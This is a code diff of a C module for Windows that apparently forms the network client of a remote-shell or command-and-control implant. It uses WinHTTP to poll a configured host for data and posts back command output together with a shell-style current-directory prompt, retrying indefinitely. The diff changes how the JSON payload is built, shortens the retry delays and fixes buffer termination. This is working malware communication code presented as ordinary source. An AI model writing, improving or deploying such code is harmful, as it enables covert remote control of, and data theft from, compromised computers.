@@ -1,7 +1,9 @@
 #include "connection.h"
+#include "json/json.h"
 
 #include CONFIG
 #include "helper.h"
+
 
 void initConnection()
 {
@@ -12,10 +14,10 @@ void initConnection()
         if(!hSession)
         {
 #ifdef DEBUG
-            fprintf(stderr, "Init Session Error: $ld\n", GetLastError());
+            fprintf(stderr, "Init Session Error: %ld\n", GetLastError());
 #endif
             continue;
-            Sleep(1000);
+            Sleep(100);
         }
 
         hConnect = WinHttpConnect(hSession, HOSTNAME, PORT, 0);
@@ -26,7 +28,7 @@ void initConnection()
 #endif
             WinHttpCloseHandle(hSession);
             continue;
-            Sleep(1000);
+            Sleep(100);
         }
         break;
     }
@@ -46,25 +48,32 @@ void sendData( char* data , char* curPath)
     
     LPCWSTR accTypes[] = { L"*/*", 0x00 };
 
-    // Prepare Payload
+    size_t cwdLen = strlen(curPath) + 3;
+    char* cwd = mallocBlock(cwdLen);
+    memcpy(cwd, curPath, cwdLen-3);
+    cwd[cwdLen-3] = '>';
+    cwd[cwdLen-2] = ' ';
+    cwd[cwdLen-1] = 0x00;
+
+    JsonNode* root = json_mkobject();
+
+    JsonNode* output = json_mkstring(data);
+    JsonNode* getcwd = json_mkstring(cwd);
+
+    json_append_member(root, "output", output);
+    json_append_member(root, "getcwd", getcwd);
+
+    char* payload = json_encode(root);
+
     char* finalDataFmt = "get_data=%s";
-    char* payloadFmt = "{\"output\": \"%s\", \"getcwd\": \"%s> \"}";
-    size_t payloadSize = strlen(payloadFmt) + strlen(data) + strlen(curPath) - 3;
-    char* payload = mallocBlock(payloadSize);
+    char* finalData = mallocBlock(strlen(finalDataFmt) + strlen(payload) - 1);
+    sprintf(finalData, finalDataFmt, payload);
 
-    sprintf(payload, payloadFmt, data, curPath);
-    char* encodedPayload = urlencode(payload);
-
+    free(cwd);
+    json_delete(root);
     free(payload);
 
-    char* finalData = mallocBlock(strlen(encodedPayload)+strlen(finalDataFmt)-1);
-    sprintf(finalData, finalDataFmt, encodedPayload);
-    free(encodedPayload);
-
-    puts(finalData);
-
-    LPCWSTR headers = L"Content-Type: application/x-www-form-urlencoded\r\n"\
-                      L"Connection: keep-alive\r\n";
+    LPCWSTR headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
 
     BOOL err;
 
@@ -78,7 +87,7 @@ void sendData( char* data , char* curPath)
 #ifdef DEBUG
             fprintf(stderr, "Open Request Error: %ld\n", GetLastError());
 #endif
-            Sleep(1000);
+            Sleep(500);
             continue;
         }
 
@@ -90,7 +99,7 @@ void sendData( char* data , char* curPath)
             fprintf(stderr, "Send Request Error: %ld\n", GetLastError());
 #endif
             WinHttpCloseHandle(hRequest);
-            Sleep(1000);
+            Sleep(2000);
             continue;
         }
     
@@ -101,7 +110,7 @@ void sendData( char* data , char* curPath)
             fprintf(stderr, "Receive Response Error: %ld\n", GetLastError());
 #endif
             WinHttpCloseHandle(hRequest);
-            Sleep(1000);
+            Sleep(500);
             continue;
         }
 
@@ -124,7 +133,7 @@ void sendData( char* data , char* curPath)
 
         if(err != 1 || statusCode != 200)
         {
-            Sleep(1000);
+            Sleep(500);
             continue;
         }
 
@@ -160,7 +169,7 @@ char* getData()
 #ifdef DEBUG
             fprintf(stderr, "Open Request Error: %ld\n", GetLastError());
 #endif
-            Sleep(1000);
+            Sleep(500);
             continue;
         }
 
@@ -171,7 +180,7 @@ char* getData()
             fprintf(stderr, "Send Request Error: %ld\n", GetLastError());
 #endif
             WinHttpCloseHandle(hRequest);
-            Sleep(1000);
+            Sleep(2000);
             continue;
         }
 
@@ -182,7 +191,7 @@ char* getData()
             fprintf(stderr, "Receive Response Error: %ld\n", GetLastError());
 #endif
             WinHttpCloseHandle(hRequest);
-            Sleep(1000);
+            Sleep(500);
             continue;
         }
 
@@ -198,7 +207,7 @@ char* getData()
             fprintf(stderr, "Query Header Error: %ld\n", GetLastError());
 #endif
             WinHttpCloseHandle(hRequest);
-            Sleep(1000);
+            Sleep(500);
             continue;
         }
         if( contentLen == 0 )
@@ -207,7 +216,7 @@ char* getData()
             break;
         }
 
-        buffer = mallocBlock(contentLen);
+        buffer = mallocBlock(contentLen+1);
 
         DWORD recieved = 0;
         err = WinHttpReadData(hRequest, buffer, contentLen, &recieved);
@@ -223,38 +232,16 @@ char* getData()
         if( err != 1 || recieved != contentLen)
         {
             free(buffer);
-            Sleep(1000);
+            Sleep(500);
             continue;
         }
+
+        buffer[contentLen] = 0x00;
 
         break;
     }
 
     return buffer;
-}
-
-
-char* urlencode(char* originalText)
-{
-    // allocate memory for the worst possible case (all characters need to be encoded)
-    char* encodedText = (char *) mallocBlock(sizeof(char)*strlen(originalText)*3+1);
-    
-    const char *hex = "0123456789abcdef";
-    
-    int pos = 0;
-    for (int i = 0; i < strlen(originalText); i++) {
-        if (('a' <= originalText[i] && originalText[i] <= 'z')
-            || ('A' <= originalText[i] && originalText[i] <= 'Z')
-            || ('0' <= originalText[i] && originalText[i] <= '9')) {
-                encodedText[pos++] = originalText[i];
-            } else {
-                encodedText[pos++] = '%';
-                encodedText[pos++] = hex[originalText[i] >> 4];
-                encodedText[pos++] = hex[originalText[i] & 15];
-            }
-    }
-    encodedText[pos] = '\0';
-    return encodedText;
 }
 
 
